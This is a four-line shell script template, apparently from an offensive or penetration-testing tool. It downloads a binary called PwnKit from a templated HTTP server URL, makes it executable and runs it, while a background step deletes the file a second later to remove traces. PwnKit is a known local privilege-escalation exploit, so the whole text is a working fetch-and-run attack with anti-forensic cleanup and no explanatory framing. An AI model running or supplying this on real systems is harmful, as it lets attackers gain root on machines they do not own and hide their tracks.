curl -fsSL {{http_server_url}}/PwnKit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit